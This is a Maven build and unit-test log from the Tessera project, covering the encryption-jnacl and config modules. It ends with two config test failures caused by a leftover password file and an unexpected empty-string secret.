16:26:33.837 [main] INFO  com.quorum.tessera.nacl.jnacl.Jnacl - Generated public key PublicKey[RGVa5GUfL/86TaC0nbS23op8VvB7HGYP5RYdOtRG4Bg=] and private key REDACTED
[INFO] Tests run: 14, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.841 s - in com.quorum.tessera.nacl.jnacl.JnaclTest
[INFO] 
[INFO] Results:
[INFO] 
[INFO] Tests run: 27, Failures: 0, Errors: 0, Skipped: 0
[INFO] 
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (report) @ encryption-jnacl ---
[INFO] Loading execution data file /tessera/encryption/encryption-jnacl/target/jacoco.exec
[INFO] Analyzed bundle 'encryption-jnacl' with 3 classes
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ encryption-jnacl ---
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:check (check) @ encryption-jnacl ---
[INFO] Loading execution data file /tessera/encryption/encryption-jnacl/target/jacoco.exec
[INFO] Analyzed bundle 'encryption-jnacl' with 3 classes
[INFO] All coverage checks have been met.
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (pre-integration-test) @ encryption-jnacl ---
[INFO] failsafeArgLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/encryption/encryption-jnacl/target/jacoco-it.exec
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:report (post-integration-test) @ encryption-jnacl ---
[INFO] Skipping JaCoCo execution due to missing execution data file.
[INFO] 
[INFO] --- editorconfig-maven-plugin:0.0.10:check (check) @ encryption-jnacl ---
[INFO] Checked 896 files
[INFO] 
[INFO] --- maven-install-plugin:2.4:install (default-install) @ encryption-jnacl ---
[INFO] Installing /tessera/encryption/encryption-jnacl/target/encryption-jnacl-0.11-SNAPSHOT.jar to /root/.m2/repository/com/jpmorgan/quorum/encryption-jnacl/0.11-SNAPSHOT/encryption-jnacl-0.11-SNAPSHOT.jar
[INFO] Installing /tessera/encryption/encryption-jnacl/pom.xml to /root/.m2/repository/com/jpmorgan/quorum/encryption-jnacl/0.11-SNAPSHOT/encryption-jnacl-0.11-SNAPSHOT.pom
[INFO] 
[INFO] ---------------------< com.jpmorgan.quorum:config >---------------------
[INFO] Building config 0.11-SNAPSHOT                                    [11/64]
[INFO] --------------------------------[ jar ]---------------------------------
[WARNING] The artifact org.hibernate:hibernate-validator:jar:6.0.2.Final has been relocated to org.hibernate.validator:hibernate-validator:jar:6.0.2.Final
[INFO] 
[INFO] --- maven-enforcer-plugin:3.0.0-M2:enforce (enforce-versions) @ config ---
[WARNING] While downloading org.hibernate:hibernate-validator:6.0.2.Final
  This artifact has been relocated to org.hibernate.validator:hibernate-validator:6.0.2.Final.


[INFO] Checking for vulnerabilities; 34 artifacts
[INFO] Exclude coordinates: []
[INFO] Exclude vulnerability identifiers: [33fe5e62-2998-4820-aebc-68e348539b22]
[INFO] CVSS-score threshold: 0.0
[INFO] Adding ignore: module-info
[INFO] Adding ignore: META-INF/versions/*/module-info
[INFO] Adding ignore: com.google.*
[INFO] 
[INFO] --- jacoco-maven-plugin:0.8.3:prepare-agent (default) @ config ---
[INFO] argLine set to -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.8.3/org.jacoco.agent-0.8.3-runtime.jar=destfile=/tessera/config/target/jacoco.exec
[INFO] 
[INFO] --- templating-maven-plugin:1.0.0:filter-sources (filter-src) @ config ---
[INFO] Coping files with filtering to temporary directory.
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO] No files needs to be copied to output directory. Up to date: /tessera/config/target/generated-sources/java-templates
[INFO] Source directory: /tessera/config/target/generated-sources/java-templates added.
[INFO] 
[INFO] --- googleformatter-maven-plugin:1.7.3:format (reformat-sources) @ config ---
[INFO] Found 89 uncompiled/modified files in /tessera/config/src/main/java to reformat.
[INFO] Found 57 uncompiled/modified files in /tessera/config/src/test/java to reformat.
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'rev-parse' '--show-prefix'
[INFO] Working directory: /tessera
[INFO] Executing: /bin/sh -c cd '/tessera' && 'git' 'status' '--porcelain' '.'
[INFO] Working directory: /tessera
[WARNING] Ignoring unrecognized line: ?? config/newPasses.txt
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ config ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 5 resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ config ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- maven-checkstyle-plugin:3.0.0:check (verify-style) @ config ---
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ config ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 22 resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ config ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 57 source files to /tessera/config/target/test-classes
[WARNING] /tessera/config/src/test/java/com/quorum/tessera/config/constraints/EitherServerConfigsOrServerValidatorTest.java: Some input files use or override a deprecated API.
[WARNING] /tessera/config/src/test/java/com/quorum/tessera/config/constraints/EitherServerConfigsOrServerValidatorTest.java: Recompile with -Xlint:deprecation for details.
[WARNING] /tessera/config/src/test/java/com/quorum/tessera/config/util/XmlProcessingCallbackTest.java: Some input files use unchecked or unsafe operations.
[WARNING] /tessera/config/src/test/java/com/quorum/tessera/config/util/XmlProcessingCallbackTest.java: Recompile with -Xlint:unchecked for details.
[INFO] 
[INFO] --- maven-surefire-plugin:3.0.0-M3:test (default-test) @ config ---
[INFO] 
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.quorum.tessera.config.apps.TesseraAppFactoryTest
16:26:40.050 [main] INFO  com.quorum.tessera.config.apps.TesseraAppFactory - Loaded app com.quorum.tessera.config.apps.MockTesseraApp@4afd21c6
16:26:40.061 [main] INFO  com.quorum.tessera.config.apps.TesseraAppFactory - Loaded app com.quorum.tessera.config.apps.OtherMockTesseraApp@7a34f66a
16:26:40.062 [main] INFO  com.quorum.tessera.config.apps.TesseraAppFactory - Creating application type THIRD_PARTY for WEB_SOCKET
16:26:40.232 [main] INFO  com.quorum.tessera.config.apps.TesseraAppFactory - Creating application type P2P for REST
16:26:40.233 [main] INFO  com.quorum.tessera.config.apps.TesseraAppFactory - Creating application type P2P for WEB_SOCKET
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.531 s - in com.quorum.tessera.config.apps.TesseraAppFactoryTest
[INFO] Running com.quorum.tessera.config.SslTrustModeTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.006 s - in com.quorum.tessera.config.SslTrustModeTest
[INFO] Running com.quorum.tessera.config.PrivateKeyTypeTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.PrivateKeyTypeTest
[INFO] Running com.quorum.tessera.config.constraints.AzureVaultKeyPairValidatorTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.809 s - in com.quorum.tessera.config.constraints.AzureVaultKeyPairValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.PathValidatorTest
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.299 s - in com.quorum.tessera.config.constraints.PathValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.SslConfigValidatorTest
[INFO] Tests run: 43, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.173 s - in com.quorum.tessera.config.constraints.SslConfigValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.UnsupportedKeyPairValidatorTest
[INFO] Tests run: 27, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.066 s - in com.quorum.tessera.config.constraints.UnsupportedKeyPairValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.EitherServerConfigsOrServerValidatorTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.018 s - in com.quorum.tessera.config.constraints.EitherServerConfigsOrServerValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.ValidContentValidatorTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.037 s - in com.quorum.tessera.config.constraints.ValidContentValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.ServerAddressValidatorTest
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.029 s - in com.quorum.tessera.config.constraints.ServerAddressValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.KeyVaultConfigurationValidatorTest
[INFO] Tests run: 23, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.242 s - in com.quorum.tessera.config.constraints.KeyVaultConfigurationValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.KeyConfigurationValidatorTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.constraints.KeyConfigurationValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.PositiveIntegerValidatorTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.constraints.PositiveIntegerValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.ServerConfigsValidatorTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s - in com.quorum.tessera.config.constraints.ServerConfigsValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.Base64ValidatorTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.constraints.Base64ValidatorTest
[INFO] Running com.quorum.tessera.config.constraints.ServerConfigValidatorTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.008 s - in com.quorum.tessera.config.constraints.ServerConfigValidatorTest
[INFO] Running com.quorum.tessera.config.ConfigTest
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.074 s - in com.quorum.tessera.config.ConfigTest
[INFO] Running com.quorum.tessera.config.util.JaxbUtilTest
16:26:43.952 [main] INFO  org.hibernate.validator.internal.util.Version - HV000001: Hibernate Validator 6.0.2.Final
[INFO] Tests run: 15, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 3.006 s - in com.quorum.tessera.config.util.JaxbUtilTest
[INFO] Running com.quorum.tessera.config.util.EnvironmentVariableProviderTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s - in com.quorum.tessera.config.util.EnvironmentVariableProviderTest
[INFO] Running com.quorum.tessera.config.util.EncryptedStringResolverTest
16:26:45.084 [main] WARN  com.quorum.tessera.config.util.ConfigSecretReader - Not able to find or read any secret for decrypting sensitive values in config.
16:26:45.150 [main] WARN  com.quorum.tessera.config.util.ConfigSecretReader - Not able to find or read any secret for decrypting sensitive values in config.
16:26:45.153 [main] WARN  com.quorum.tessera.config.util.EncryptedStringResolver - Some sensitive values are being given as unencrypted plain text in config. Please note this is NOT recommended for production environment.
16:26:45.153 [main] WARN  com.quorum.tessera.config.util.EncryptedStringResolver - Some sensitive values are being given as unencrypted plain text in config. Please note this is NOT recommended for production environment.
16:26:45.154 [main] WARN  com.quorum.tessera.config.util.EncryptedStringResolver - Some sensitive values are being given as unencrypted plain text in config. Please note this is NOT recommended for production environment.
16:26:45.155 [main] WARN  com.quorum.tessera.config.util.EncryptedStringResolver - Some sensitive values are being given as unencrypted plain text in config. Please note this is NOT recommended for production environment.
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.085 s - in com.quorum.tessera.config.util.EncryptedStringResolverTest
[INFO] Running com.quorum.tessera.config.util.ConfigFileStoreTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.129 s - in com.quorum.tessera.config.util.ConfigFileStoreTest
[INFO] Running com.quorum.tessera.config.util.XmlProcessingCallbackTest
16:26:45.296 [main] ERROR com.quorum.tessera.config.util.XmlProcessingCallback - null
javax.xml.bind.JAXBException: 
        at com.quorum.tessera.config.util.XmlProcessingCallbackTest.lambda$executeThrowsJAXBException$2(XmlProcessingCallbackTest.java:31)
        at com.quorum.tessera.config.util.XmlProcessingCallback.execute(XmlProcessingCallback.java:20)
        at com.quorum.tessera.config.util.XmlProcessingCallbackTest.executeThrowsJAXBException(XmlProcessingCallbackTest.java:33)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
        at org.junit.internal.runners.statements.ExpectException.evaluate(ExpectException.java:19)
        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:384)
        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:345)
        at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:126)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:418)
16:26:45.298 [main] ERROR com.quorum.tessera.config.util.XmlProcessingCallback - null
java.io.IOException: null
        at com.quorum.tessera.config.util.XmlProcessingCallbackTest.lambda$executeThrowsIOException$1(XmlProcessingCallbackTest.java:22)
        at com.quorum.tessera.config.util.XmlProcessingCallback.execute(XmlProcessingCallback.java:20)
        at com.quorum.tessera.config.util.XmlProcessingCallbackTest.executeThrowsIOException(XmlProcessingCallbackTest.java:24)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
        at org.junit.internal.runners.statements.ExpectException.evaluate(ExpectException.java:19)
        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:384)
        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:345)
        at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:126)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:418)
16:26:45.299 [main] ERROR com.quorum.tessera.config.util.XmlProcessingCallback - null
javax.xml.transform.TransformerException: 
        at com.quorum.tessera.config.util.XmlProcessingCallbackTest.lambda$executeThrowsTransformerException$3(XmlProcessingCallbackTest.java:40)
        at com.quorum.tessera.config.util.XmlProcessingCallback.execute(XmlProcessingCallback.java:20)
        at com.quorum.tessera.config.util.XmlProcessingCallbackTest.executeThrowsTransformerException(XmlProcessingCallbackTest.java:42)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
        at org.junit.internal.runners.statements.ExpectException.evaluate(ExpectException.java:19)
        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:384)
        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:345)
        at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:126)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:418)
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.022 s - in com.quorum.tessera.config.util.XmlProcessingCallbackTest
[INFO] Running com.quorum.tessera.config.util.ConfigSecretReaderTest
16:26:45.302 [main] WARN  com.quorum.tessera.config.util.ConfigSecretReader - Not able to find or read any secret for decrypting sensitive values in config.
16:26:45.304 [main] WARN  com.quorum.tessera.config.util.ConfigSecretReader - Not able to find or read any secret for decrypting sensitive values in config.
[ERROR] Tests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.006 s <<< FAILURE! - in com.quorum.tessera.config.util.ConfigSecretReaderTest
[ERROR] testReadException(com.quorum.tessera.config.util.ConfigSecretReaderTest)  Time elapsed: 0.005 s  <<< FAILURE!
java.lang.AssertionError: 

Expecting an empty Optional but was containing value: <"">.
        at com.quorum.tessera.config.util.ConfigSecretReaderTest.testReadException(ConfigSecretReaderTest.java:74)

[INFO] Running com.quorum.tessera.config.util.EnvironmentVariableProviderFactoryImplTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.util.EnvironmentVariableProviderFactoryImplTest
[INFO] Running com.quorum.tessera.config.JaxbConfigFactoryTest
[ERROR] Tests run: 9, Failures: 1, Errors: 1, Skipped: 0, Time elapsed: 0.169 s <<< FAILURE! - in com.quorum.tessera.config.JaxbConfigFactoryTest
[ERROR] cantAppendToPasswordFileThrowsError(com.quorum.tessera.config.JaxbConfigFactoryTest)  Time elapsed: 0 s  <<< ERROR!
java.nio.file.FileAlreadyExistsException: newPasses.txt
        at com.quorum.tessera.config.JaxbConfigFactoryTest.cantAppendToPasswordFileThrowsError(JaxbConfigFactoryTest.java:88)

[ERROR] createNewLockedKeyCreatesNewPasswordFile(com.quorum.tessera.config.JaxbConfigFactoryTest)  Time elapsed: 0.021 s  <<< FAILURE!
java.lang.AssertionError: 

Expected size:<1> but was:<33> in:
<["null",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass"]>
        at com.quorum.tessera.config.JaxbConfigFactoryTest.createNewLockedKeyCreatesNewPasswordFile(JaxbConfigFactoryTest.java:81)

[INFO] Running com.quorum.tessera.config.ConfigFactoryTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.133 s - in com.quorum.tessera.config.ConfigFactoryTest
[INFO] Running com.quorum.tessera.config.vault.data.HashicorpGetSecretDataTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.vault.data.HashicorpGetSecretDataTest
[INFO] Running com.quorum.tessera.config.vault.data.AzureSetSecretDataTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.vault.data.AzureSetSecretDataTest
[INFO] Running com.quorum.tessera.config.vault.data.AzureGetSecretDataTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.vault.data.AzureGetSecretDataTest
[INFO] Running com.quorum.tessera.config.vault.data.HashicorpSetSecretDataTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.vault.data.HashicorpSetSecretDataTest
[INFO] Running com.quorum.tessera.config.ObjectFactoryTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.ObjectFactoryTest
[INFO] Running com.quorum.tessera.config.DeprecatedServerConfigTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.DeprecatedServerConfigTest
[INFO] Running com.quorum.tessera.config.ServerConfigTest
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.144 s - in com.quorum.tessera.config.ServerConfigTest
[INFO] Running com.quorum.tessera.config.HashicorpKeyVaultConfigTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s - in com.quorum.tessera.config.HashicorpKeyVaultConfigTest
[INFO] Running com.quorum.tessera.config.KeyVaultTypeTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.KeyVaultTypeTest
[INFO] Running com.quorum.tessera.config.ConfigExceptionTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.ConfigExceptionTest
[INFO] Running com.quorum.tessera.config.keys.KeyEncryptorFactoryTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s - in com.quorum.tessera.config.keys.KeyEncryptorFactoryTest
[INFO] Running com.quorum.tessera.config.keys.KeyEncryptorTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.042 s - in com.quorum.tessera.config.keys.KeyEncryptorTest
[INFO] Running com.quorum.tessera.config.JaxbCreateFactoryTest
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.017 s - in com.quorum.tessera.config.JaxbCreateFactoryTest
[INFO] Running com.quorum.tessera.config.ValidationTest
[INFO] Tests run: 27, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.802 s - in com.quorum.tessera.config.ValidationTest
[INFO] Running com.quorum.tessera.config.SslAuthenticationModeTest
[INFO] Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.SslAuthenticationModeTest
[INFO] Running com.quorum.tessera.config.InfluxConfigTest
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.InfluxConfigTest
[INFO] Running com.quorum.tessera.config.adapters.PathAdapterTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.adapters.PathAdapterTest
[INFO] Running com.quorum.tessera.config.adapters.PrivateKeyTypeAdapterTest
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.adapters.PrivateKeyTypeAdapterTest
[INFO] Running com.quorum.tessera.config.adapters.KeyDataAdapterTest
[INFO] Tests run: 24, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.011 s - in com.quorum.tessera.config.adapters.KeyDataAdapterTest
[INFO] Running com.quorum.tessera.config.OpenPojoTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.977 s - in com.quorum.tessera.config.OpenPojoTest
[INFO] Running com.quorum.tessera.config.AzureKeyVaultConfigTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.AzureKeyVaultConfigTest
[INFO] Running com.quorum.tessera.config.keypairs.AzureVaultKeyPairTest
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.keypairs.AzureVaultKeyPairTest
[INFO] Running com.quorum.tessera.config.keypairs.InlineKeypairTest
16:26:47.773 [main] WARN  com.quorum.tessera.nacl.jnacl.Jnacl - Could not open sealed payload using shared key SharedKey[O2rFa/UW89U/RHKZJR3nd2H5aM3veXk6qwWlfmXeM7A=]
16:26:47.785 [main] WARN  com.quorum.tessera.nacl.jnacl.Jnacl - Could not open sealed payload using shared key SharedKey[97ND1oyJ67hSq3t2fj7iZPVVIRgXC0ZvtQv7QjUOrhA=]
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.099 s - in com.quorum.tessera.config.keypairs.InlineKeypairTest
[INFO] Running com.quorum.tessera.config.keypairs.FilesystemKeyPairTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.066 s - in com.quorum.tessera.config.keypairs.FilesystemKeyPairTest
[INFO] Running com.quorum.tessera.config.keypairs.HashicorpVaultKeyPairTest
[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.keypairs.HashicorpVaultKeyPairTest
[INFO] Running com.quorum.tessera.config.keypairs.UnsupportedKeyPairTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s - in com.quorum.tessera.config.keypairs.UnsupportedKeyPairTest
[INFO] Running com.quorum.tessera.config.keypairs.DirectKeyPairTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s - in com.quorum.tessera.config.keypairs.DirectKeyPairTest
[INFO] 
[INFO] Results:
[INFO] 
[ERROR] Failures: 
[ERROR]   JaxbConfigFactoryTest.createNewLockedKeyCreatesNewPasswordFile:81 
Expected size:<1> but was:<33> in:
<["null",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass",
    "pass"]>
[ERROR]   ConfigSecretReaderTest.testReadException:74 
Expecting an empty Optional but was containing value: <"">.
